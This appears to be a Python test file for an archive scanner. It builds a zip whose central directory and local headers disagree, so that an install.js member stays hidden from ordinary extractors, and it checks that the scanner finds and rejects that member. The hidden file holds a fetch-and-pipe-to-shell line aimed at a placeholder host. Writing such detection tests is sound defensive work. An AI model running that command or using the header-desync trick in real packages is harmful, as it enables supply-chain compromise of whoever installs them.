"""A zip whose local headers and central directory disagree (`package.md` PK-07)."""

from __future__ import annotations

import io
import struct
import zipfile

from cordon_scanner.archive.safe import ArchiveReader, Rejection


class TestAMemberOnlyAStreamingExtractorSeesIsFound:
    @staticmethod
    def hidden_zip() -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("package/index.js", "module.exports = 1;\n")
            archive.writestr(
                "package/install.js", "require('child_process').exec('curl evil|sh')\n"
            )
        data = buf.getvalue()
        # Drop the second central-directory record, so only the local header carries the member.
        end = data.rindex(b"PK\x05\x06")
        _directory_size, directory_offset = struct.unpack_from("<LL", data, end + 12)
        first = data.index(b"PK\x01\x02", directory_offset)
        second = data.index(b"PK\x01\x02", first + 4)
        kept = data[first:second]
        eocd = bytearray(data[end:])
        struct.pack_into("<HHLL", eocd, 8, 1, 1, len(kept), directory_offset)
        return data[:directory_offset] + kept + bytes(eocd)

    def test_the_hidden_member_is_refused_and_still_scanned(self) -> None:
        result = ArchiveReader.extract(self.hidden_zip(), path="p.zip")
        names = [m.name for m in result.members]
        assert "package/index.js" in names
        assert "zip-local/package/install.js" in names
        hidden = [r for r in result.rejected if r.reason == Rejection.HIDDEN]
        assert [r.name for r in hidden] == ["package/install.js"]
        payload = next(m for m in result.members if m.name.startswith("zip-local/")).data
        assert b"curl evil" in payload

    def test_an_ordinary_zip_has_no_hidden_member(self) -> None:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as archive:
            for i in range(5):
                archive.writestr(f"p/{i}.py", f"x = {i}\n")
        result = ArchiveReader.extract(buf.getvalue(), path="p.zip")
        assert not [r for r in result.rejected if r.reason == Rejection.HIDDEN]
        assert len(result.members) == 5
